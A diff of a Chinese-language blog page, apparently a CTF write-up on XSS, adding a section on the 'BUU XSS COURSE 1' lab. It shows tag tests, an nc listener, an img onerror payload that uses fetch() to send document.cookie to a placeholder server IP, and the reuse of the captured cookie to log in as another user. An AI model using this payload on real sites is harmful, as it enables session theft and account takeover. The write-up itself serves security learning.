@@ -40,8 +40,13 @@
 <meta property="og:image" content="http://downbeat.top/capture_20241120221716769.bmp">
 <meta property="og:image" content="http://downbeat.top/capture_20241120223411159.bmp">
 <meta property="og:image" content="http://downbeat.top/capture_20241120223603988.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241121205207372.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241121205438745.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241121205643170.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241121210416731.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241121210558377.bmp">
 <meta property="article:published_time" content="2024-11-20T13:16:38.000Z">
-<meta property="article:modified_time" content="2024-11-20T14:37:58.415Z">
+<meta property="article:modified_time" content="2024-11-21T13:06:34.412Z">
 <meta property="article:author" content="downbeat">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="XSS">
@@ -237,8 +242,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-20 22:37:58</span>
-            <span class="mobile">2024-11-20 22:37:58</span>
+            <span class="desktop">2024-11-21 21:06:34</span>
+            <span class="mobile">2024-11-21 21:06:34</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -264,12 +269,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>8 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>9 分钟</span>
         </span>
     
     
@@ -426,6 +431,47 @@
 <ul>
 <li>然后就有flag了</li>
 </ul>
+<h2 id="BUU-XSS-COURSE-1"><a href="#BUU-XSS-COURSE-1" class="headerlink" title="BUU XSS COURSE 1"></a>BUU XSS COURSE 1</h2><ul>
+<li>进入网址发现登录不上，那么便从吐槽页面入手</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205207372.bmp"></p>
+<ul>
+<li>照常先用简单的两个标签测试一下：</li>
+</ul>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>第一条语句没回显，但是第二个<code>img</code>标签是有回显的，那么后面就拿img标签来写：</p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205438745.bmp"></p>
+<ul>
+<li>我们在云服务器先启一个监听，然后利用xss带出cookie看一看：</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;fetch(&#x27;http://服务器ip:8000/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个payload的意思是：</p>
+<blockquote>
+<p><strong><code>onerror</code> 事件触发</strong>：当图片加载失败时，触发 <code>onerror</code> 事件。</p>
+<p><strong>使用 <code>fetch</code> 发送数据</strong>：</p>
+<ul>
+<li><code>fetch</code> 是现代浏览器支持的简洁 API，可用于向服务器发送请求。</li>
+<li><code>document.cookie</code> 直接获取当前页面的 Cookie。</li>
+</ul>
+<p><strong>发送 Cookie 到你的服务器</strong>：</p>
+<ul>
+<li>将 <code>cookie</code> 附加到 URL，便于你的服务器接收和记录。</li>
+</ul>
+</blockquote>
+<ul>
+<li>我们查看服务器：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205643170.bmp"></p>
+<p>我们可以看到这个cookie是从当前web端获得的，可以猜测这是一个登录成功用户的cookie，下面的<code>Referer</code>表示我们是从那个页面跳转过来的，我们去查看一下那个页面：</p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121210416731.bmp"></p>
+<ul>
+<li>提醒我们没登陆，那么简单，我们抓包修改<code>cookie</code>为云服务器收到的<code>cookie</code>即可:</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121210558377.bmp"></p>
 
         </div>
 
@@ -440,7 +486,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-11-20 22:37:58
+                    :</strong> 2024-11-21 21:06:34
             </li>
         
         <li>
@@ -553,7 +599,7 @@
     <div class="post-toc">
         <div class="toc-title">目录</div>
         <div class="page-title">XSS</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-XSS%E9%97%AF%E5%85%B3"><span class="nav-text">[第二章 web进阶]XSS闯关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F"><span class="nav-text">预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="nav-text">代码流程</span></a></li></ol></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-XSS%E9%97%AF%E5%85%B3"><span class="nav-text">[第二章 web进阶]XSS闯关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F"><span class="nav-text">预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="nav-text">代码流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-XSS-COURSE-1"><span class="nav-text">BUU XSS COURSE 1</span></a></li></ol></li></ol>
 
     </div>
 </div>
@@ -590,7 +636,7 @@
                     </span>
                     
                         <span>
-                            共 46.9k 字
+                            共 47.2k 字
                         </span>
                     
                 </p>
